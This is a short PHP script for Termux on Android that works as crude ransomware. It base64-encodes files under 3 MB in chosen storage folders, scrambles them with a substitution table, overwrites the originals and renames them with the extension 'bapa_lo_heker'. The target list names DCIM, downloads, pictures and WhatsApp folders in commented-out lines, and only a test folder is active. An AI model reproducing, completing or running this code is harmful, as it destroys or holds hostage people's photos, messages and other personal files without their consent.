<?php 
	
	/* open termux-setup-storage */
	system('termux-setup-storage');
	$ext = "bapa_lo_heker";
	
	function encryptFile($value, $dir){

        /* global variabel */
        global $ext;

        $encArr = ['a' => '~','b' => '@','c' => 'Y','d' => 'O','e' => ']','f' => 'V','g' => 'uP','h' => '#','i' => '4a','j' => 'm+','k' => 'z','l' => 'b;','m' => '7','n' => '3','o' => 'z*','p' => 'm','q' => '4','r' => '%','s' => 'Yp','t' => 'W','u' => 'U','v' => 'N','w' => 'a','x' => '(','y' => '|o','z' => '/','A' => 'G','B' => 'M','C' => 'mM','D' => 'B','E' => '1<','F' => '*','G' => 'a#','H' => 'S','I' => '&','J' => '0v','K' => 'H','L' => '1+','M' => 'G/','N' => 'x?','O' => 'h1','P' => 'Ux','Q' => 'L4','R' => 'v','S' => 'u','T' => 'aW','U' => '4L','V' => 'L','W' => 'J','X' => '8','Y' => 'n','Z' => '','1' => 'x','2' => 'b','3' => '+7','4' => 'X','5' => 's','6' => ')','7' => '$','8' => 'o','9' => '+','0' => 'A','=' => 'w','+' => '[4','/' => '1'];

        $encrypt = "";
        for($no = 0; $no < strlen($value); $no++){

            $key = substr($value, $no, 1);
            $encrypt .= $encArr[$key].".";
        };

        $o = fopen($dir, 'w');
        fwrite($o, $encrypt);
        fclose($o);

        rename($dir, $dir.".".$ext);
    }

    function getFile($dir){
        
        /* global variabel */
        global $ext;

        $fileList = glob($dir."/*");
        foreach ($fileList as $filename) {
            if(is_file($filename)){

                $info = pathinfo($filename);
                if ($info['extension'] !== $ext) {

                    // not support file 3 mb
                    if (filesize($filename) < 3000000) {
                        $base = base64_encode(file_get_contents($filename));
                        encryptFile($base, $filename);
                        echo '[+] '. $filename."\n";
                    }
                }
            }else{
                getFile($filename);
            }
        }   
    }

    $root = '/data/data/com.termux/files/home/';
    $diskArr = [
    	// 'storage/dcim',
    	// 'storage/downloads',
    	// 'storage/pictures',
    	// 'storage/shared/Whatsapp',
    	'storage/ass'
    ];

    foreach ($diskArr as $key) {

        $dir = $root.$key;
        if (is_dir($dir)) {
        	
        	// dir ditemukan
        	getFile($dir);
        }else{
        	echo "tidak ketemu";
        }

        // $root = $key.":\\";
        // $ext  = $files->ext;
        // $extLength = strlen($ext) + 1;
        // getFile($root);
    }

?>
